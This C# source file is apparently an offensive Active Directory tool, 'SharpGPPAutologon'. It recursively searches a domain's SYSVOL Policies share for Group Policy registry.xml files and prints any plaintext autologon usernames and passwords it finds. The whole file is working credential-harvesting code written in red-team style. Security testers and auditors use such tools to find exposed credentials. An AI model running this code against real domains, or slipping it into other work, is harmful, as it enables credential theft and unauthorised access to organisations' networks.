using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Xml;

namespace SharpGPPAutologon
{
    internal class Program
    {
        static void Main(string[] args)
        {
            bool verbose = args.Contains("/verbose");

            string domain = Environment.GetEnvironmentVariable("USERDNSDOMAIN");
            string sysvolPath = $"\\\\{domain}\\SYSVOL\\{domain}\\Policies";
            List<string> registryFiles = new List<string>();

            bool credentialsFound = false;

            Console.WriteLine($"[*] Searching for registry.xml files in {sysvolPath}...");
            FindRegistryFilesRecursive(sysvolPath, ref registryFiles, verbose);

            if (registryFiles.Count > 0)
            {
                Console.WriteLine($"[*] Found {registryFiles.Count} registry.xml files.");
                Console.WriteLine("[*] Processing the files and checking for credentials...");

                foreach (string filePath in registryFiles)
                {
                    ExtractAutologonCredentials(filePath, ref credentialsFound, verbose);
                }
            }

            if (!credentialsFound)
            {
                Console.WriteLine("[-] No credentials found! Better luck next time...");
            }
        }

        static void FindRegistryFilesRecursive(string path, ref List<string> registryFiles, bool verbose)
        {
            try
            {
                // Checking for registry.xml
                string[] files = Directory.GetFiles(path, "registry.xml");
                registryFiles.AddRange(files);

                // Iterate recursively over subdirectories
                string[] directories = Directory.GetDirectories(path);
                foreach (string directory in directories)
                {
                    FindRegistryFilesRecursive(directory, ref registryFiles, verbose);
                }
            }
            catch (UnauthorizedAccessException ex)
            {
                // Access denied
                if(verbose) Console.WriteLine($"[-] Error accessing {path}: Access denied.");
            }
            catch (Exception ex)
            {
                // Other error occured
                if(verbose) Console.WriteLine($"[-] Error accessing {path}: {ex.Message}");
            }
        }

        static void ExtractAutologonCredentials(string filePath, ref bool credentialsFound, bool verbose)
        {
            if(verbose) Console.WriteLine($"[*] Processing file: {filePath}");

            XmlDocument xmlDoc = new XmlDocument();
            xmlDoc.Load(filePath);

            // Get registry elements
            XmlNodeList registryNodes = xmlDoc.GetElementsByTagName("Registry");

            string username = null;
            string password = null;

            foreach (XmlNode registryNode in registryNodes)
            {
                // Check for 'DefaultUserName' and 'DefaultPassword' and extract the value
                if (registryNode.Attributes["name"]?.Value == "DefaultUserName")
                {
                    username = registryNode["Properties"]?.Attributes["value"]?.Value;
                }
                else if (registryNode.Attributes["name"]?.Value == "DefaultPassword")
                {
                    password = registryNode["Properties"]?.Attributes["value"]?.Value;
                }
            }

            // If credentials were found, then print them
            if (username != null && password != null)
            {
                Console.WriteLine($"[+] Credentials found in {filePath}");
                Console.WriteLine($"    Username: {username}");
                Console.WriteLine($"    Password: {password}");

                credentialsFound = true;
            }
        }
    }
}
